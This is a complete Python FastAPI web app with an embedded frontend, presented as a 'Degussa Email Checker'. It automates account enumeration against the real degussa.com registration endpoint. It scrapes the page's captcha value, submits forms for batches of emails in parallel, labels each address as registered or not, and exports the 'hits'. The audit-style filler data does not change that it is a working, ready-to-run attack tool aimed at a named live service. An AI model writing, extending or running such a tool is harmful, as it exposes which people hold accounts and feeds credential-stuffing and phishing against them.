#!/usr/bin/env python3
"""
Degussa Email Checker — Web Interface
Single-file FastAPI app: API + embedded frontend.
"""

import httpx
import re
import asyncio
import json
import time
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, StreamingResponse
from pydantic import BaseModel

app = FastAPI()

# ─── Config ───
TARGET_URL = "https://degussa.com/ch-de/ssologin/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HEADERS = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "de-CH,de;q=0.9",
    "Origin": "https://degussa.com",
    "Referer": TARGET_URL,
    "Content-Type": "application/x-www-form-urlencoded",
}
FORM_DEFAULTS = {
    "input_password": "AuditTest99!Xz",
    "input_password_2": "AuditTest99!Xz",
    "salutation": "m",
    "sur_name": "Security",
    "last_name": "Audit",
    "input_street": "Teststrasse",
    "input_street_no": "1",
    "post_code": "8001",
    "city": "Zurich",
    "country": "ch",
    "birthday": "01.01.1985",
    "input_phone_no": "+41700000000",
    "input_captcha1": "",
    "newsletter_subscribe": "0",
    "saveModelFormButton": "true",
}


async def check_single(client: httpx.AsyncClient, email: str) -> dict:
    """Check one email against Degussa registration."""
    try:
        r1 = await client.get(TARGET_URL, headers=HEADERS, follow_redirects=True, timeout=15)
        m = re.search(r'input_captcha2.*?value="(\d+)"', r1.text)
        if not m:
            return {"email": email, "status": "error", "detail": "captcha2 missing"}

        data = {**FORM_DEFAULTS, "input_email": email, "input_email_2": email, "input_captcha2": m.group(1)}
        r2 = await client.post(TARGET_URL, headers=HEADERS, data=data, follow_redirects=True, timeout=15)

        if "modal--error" in r2.text:
            return {"email": email, "status": "registered"}
        elif "modal--success" in r2.text:
            return {"email": email, "status": "not_found"}
        else:
            return {"email": email, "status": "unknown", "detail": "unexpected response"}
    except Exception as e:
        return {"email": email, "status": "error", "detail": str(e)[:120]}


class CheckRequest(BaseModel):
    emails: list[str]
    threads: int = 3
    delay: float = 0.5


@app.post("/api/check")
async def check_emails(req: CheckRequest):
    """Check a batch — returns Server-Sent Events for live results."""
    emails = [e.strip() for e in req.emails if e.strip() and "@" in e.strip()]
    threads = max(1, min(req.threads, 10))
    delay = max(0, req.delay)

    async def stream():
        sem = asyncio.Semaphore(threads)
        stats = {"registered": 0, "not_found": 0, "error": 0, "total": len(emails)}
        yield f"data: {json.dumps({'type': 'start', 'total': len(emails)})}\n\n"

        async def bounded(em):
            async with sem:
                async with httpx.AsyncClient(http2=True, verify=True) as client:
                    return await check_single(client, em)

        for i in range(0, len(emails), threads):
            batch = emails[i:i + threads]
            tasks = [bounded(em) for em in batch]
            results = await asyncio.gather(*tasks)
            for r in results:
                stats[r["status"]] = stats.get(r["status"], 0) + 1
                yield f"data: {json.dumps({'type': 'result', **r, 'stats': stats})}\n\n"
            if delay > 0 and i + threads < len(emails):
                await asyncio.sleep(delay)

        yield f"data: {json.dumps({'type': 'done', 'stats': stats})}\n\n"

    return StreamingResponse(stream(), media_type="text/event-stream")


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_PAGE


# ─── Embedded Frontend ───
HTML_PAGE = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Degussa Email Checker</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; }

:root {
  --bg: #0a0a0f;
  --surface: #12121a;
  --surface2: #1a1a27;
  --border: #2a2a3d;
  --text: #e0e0ee;
  --text2: #8888aa;
  --green: #00ff88;
  --red: #ff4466;
  --yellow: #ffaa22;
  --cyan: #00ccff;
  --accent: #7c5cff;
}

body {
  background: var(--bg);
  color: var(--text);
  font-family: 'Inter', sans-serif;
  min-height: 100vh;
}

.container { max-width: 860px; margin: 0 auto; padding: 40px 20px; }

header {
  text-align: center;
  margin-bottom: 48px;
}
header h1 {
  font-family: 'JetBrains Mono', monospace;
  font-size: 28px;
  font-weight: 700;
  letter-spacing: -0.5px;
  color: var(--text);
}
header h1 span { color: var(--cyan); }
header p {
  margin-top: 8px;
  font-size: 13px;
  color: var(--text2);
  font-family: 'JetBrains Mono', monospace;
}

.card {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 28px;
  margin-bottom: 24px;
}

label {
  display: block;
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: var(--text2);
  margin-bottom: 8px;
}

textarea {
  width: 100%;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 14px;
  color: var(--text);
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  resize: vertical;
  min-height: 120px;
  outline: none;
  transition: border-color 0.2s;
}
textarea:focus { border-color: var(--cyan); }
textarea::placeholder { color: #444466; }

.controls {
  display: flex;
  gap: 16px;
  align-items: flex-end;
  margin-top: 20px;
  flex-wrap: wrap;
}

.field { flex: 1; min-width: 100px; }
.field input {
  width: 100%;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 10px 12px;
  color: var(--text);
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  outline: none;
}
.field input:focus { border-color: var(--cyan); }

button#run {
  background: var(--cyan);
  color: var(--bg);
  border: none;
  border-radius: 8px;
  padding: 10px 32px;
  font-family: 'JetBrains Mono', monospace;
  font-weight: 700;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.15s;
  white-space: nowrap;
}
button#run:hover { background: #33ddff; transform: translateY(-1px); }
button#run:active { transform: translateY(0); }
button#run:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }

.stats {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 12px;
  margin-bottom: 24px;
}
.stat {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 16px;
  text-align: center;
}
.stat .num {
  font-family: 'JetBrains Mono', monospace;
  font-size: 28px;
  font-weight: 700;
  line-height: 1;
}
.stat .lbl {
  font-size: 11px;
  color: var(--text2);
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-top: 6px;
}
.stat.hit .num { color: var(--red); }
.stat.miss .num { color: var(--green); }
.stat.err .num { color: var(--yellow); }
.stat.total .num { color: var(--cyan); }

.progress-wrap {
  height: 4px;
  background: var(--surface2);
  border-radius: 2px;
  margin-bottom: 24px;
  overflow: hidden;
}
.progress-bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, var(--cyan), var(--accent));
  border-radius: 2px;
  transition: width 0.3s;
}

#results { display: none; }

.results-table {
  width: 100%;
  border-collapse: collapse;
}
.results-table th {
  text-align: left;
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: var(--text2);
  padding: 10px 14px;
  border-bottom: 1px solid var(--border);
}
.results-table td {
  padding: 10px 14px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  border-bottom: 1px solid #1a1a24;
}
.results-table tr { transition: background 0.15s; }
.results-table tr:hover { background: var(--surface2); }

.badge {
  display: inline-block;
  padding: 3px 10px;
  border-radius: 20px;
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.badge.registered { background: rgba(255,68,102,0.15); color: var(--red); }
.badge.not_found  { background: rgba(0,255,136,0.12); color: var(--green); }
.badge.error      { background: rgba(255,170,34,0.12); color: var(--yellow); }
.badge.unknown    { background: rgba(136,136,170,0.12); color: var(--text2); }

.export-bar {
  display: flex;
  gap: 10px;
  margin-top: 16px;
  justify-content: flex-end;
}
.export-bar button {
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text2);
  border-radius: 6px;
  padding: 6px 16px;
  font-size: 12px;
  font-family: 'JetBrains Mono', monospace;
  cursor: pointer;
  transition: all 0.15s;
}
.export-bar button:hover { color: var(--text); border-color: var(--cyan); }

@media (max-width: 600px) {
  .stats { grid-template-columns: repeat(2, 1fr); }
  .controls { flex-direction: column; }
}
</style>
</head>
<body>
<div class="container">
  <header>
    <h1><span>&#9670;</span> Degussa <span>Checker</span></h1>
    <p>email enumeration &middot; registration endpoint &middot; no captcha</p>
  </header>

  <div class="card">
    <label>Emails (un par ligne)</label>
    <textarea id="emails" placeholder="email1@example.com&#10;email2@example.com&#10;email3@example.com"></textarea>
    <div class="controls">
      <div class="field">
        <label>Threads</label>
        <input id="threads" type="number" value="3" min="1" max="10">
      </div>
      <div class="field">
        <label>Delay (s)</label>
        <input id="delay" type="number" value="0.5" min="0" max="10" step="0.1">
      </div>
      <button id="run" onclick="startCheck()">CHECK</button>
    </div>
  </div>

  <div id="results">
    <div class="stats">
      <div class="stat hit"><div class="num" id="s-reg">0</div><div class="lbl">Registered</div></div>
      <div class="stat miss"><div class="num" id="s-nf">0</div><div class="lbl">Not Found</div></div>
      <div class="stat err"><div class="num" id="s-err">0</div><div class="lbl">Errors</div></div>
      <div class="stat total"><div class="num" id="s-total">0</div><div class="lbl">Total</div></div>
    </div>
    <div class="progress-wrap"><div class="progress-bar" id="pbar"></div></div>
    <div class="card" style="padding:0; overflow:hidden;">
      <table class="results-table">
        <thead><tr><th>#</th><th>Email</th><th>Status</th></tr></thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
    <div class="export-bar">
      <button onclick="exportAll()">Export All (.txt)</button>
      <button onclick="exportHits()">Export Hits Only</button>
    </div>
  </div>
</div>

<script>
let allResults = [];

async function startCheck() {
  const raw = document.getElementById('emails').value;
  const emails = raw.split('\\n').map(e => e.trim()).filter(e => e && e.includes('@'));
  if (!emails.length) return;

  const threads = parseInt(document.getElementById('threads').value) || 3;
  const delay = parseFloat(document.getElementById('delay').value) || 0.5;
  const btn = document.getElementById('run');

  btn.disabled = true;
  btn.textContent = 'CHECKING...';
  allResults = [];
  document.getElementById('results').style.display = 'block';
  document.getElementById('tbody').innerHTML = '';
  document.getElementById('pbar').style.width = '0%';
  updateStats({registered: 0, not_found: 0, error: 0, total: emails.length});

  let idx = 0;

  try {
    const resp = await fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({emails, threads, delay})
    });

    const reader = resp.body.getReader();
    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
      const {done, value} = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, {stream: true});

      const lines = buffer.split('\\n');
      buffer = lines.pop();

      for (const line of lines) {
        if (!line.startsWith('data: ')) continue;
        const data = JSON.parse(line.slice(6));

        if (data.type === 'result') {
          idx++;
          allResults.push(data);
          addRow(idx, data);
          if (data.stats) updateStats(data.stats);
          const pct = (idx / emails.length) * 100;
          document.getElementById('pbar').style.width = pct + '%';
        }
        if (data.type === 'done') {
          document.getElementById('pbar').style.width = '100%';
        }
      }
    }
  } catch(e) {
    console.error(e);
  }

  btn.disabled = false;
  btn.textContent = 'CHECK';
}

function addRow(idx, r) {
  const tr = document.createElement('tr');
  tr.innerHTML = `
    <td style="color:var(--text2)">${idx}</td>
    <td>${r.email}</td>
    <td><span class="badge ${r.status}">${label(r.status)}</span></td>
  `;
  document.getElementById('tbody').prepend(tr);
}

function label(s) {
  return {registered: 'REGISTERED', not_found: 'NOT FOUND', error: 'ERROR', unknown: 'UNKNOWN'}[s] || s;
}

function updateStats(s) {
  document.getElementById('s-reg').textContent = s.registered || 0;
  document.getElementById('s-nf').textContent = s.not_found || 0;
  document.getElementById('s-err').textContent = (s.error || 0) + (s.unknown || 0);
  document.getElementById('s-total').textContent = s.total || 0;
}

function exportAll() {
  const txt = allResults.map(r => r.status.padEnd(16) + r.email).join('\\n');
  download('results.txt', txt);
}

function exportHits() {
  const txt = allResults.filter(r => r.status === 'registered').map(r => r.email).join('\\n');
  if (!txt) return alert('Aucun hit');
  download('hits.txt', txt);
}

function download(name, content) {
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
  a.download = name;
  a.click();
}
</script>
</body>
</html>
"""

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
